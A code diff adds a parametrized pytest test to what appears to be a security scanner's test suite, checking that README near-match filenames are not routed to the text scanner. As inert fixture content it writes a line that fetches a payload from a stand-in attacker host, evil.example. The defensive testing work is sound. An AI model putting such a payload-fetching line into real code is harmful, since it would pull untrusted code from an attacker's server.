@@ -667,6 +667,19 @@ def test_get_scanner_for_path_routes_suffixed_documentation_to_text_scanner(
     _assert_scanner_for_path(readme_path, "text")
 
 
+@pytest.mark.parametrize("filename", ["README.md.bak", "README.png"])
+def test_get_scanner_for_path_does_not_route_readme_near_matches_to_text(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    readme_path = tmp_path / filename
+    readme_path.write_text('requests.get("https://evil.example/payload")\n')
+
+    scanner_class = ScannerRegistry().get_scanner_for_path(str(readme_path))
+
+    assert scanner_class is None or scanner_class.name != "text"
+
+
 @pytest.mark.parametrize("filename", ["README", "model_card"])
 def test_get_scanner_for_path_routes_extensionless_documentation_to_text_scanner(
     tmp_path: Path,
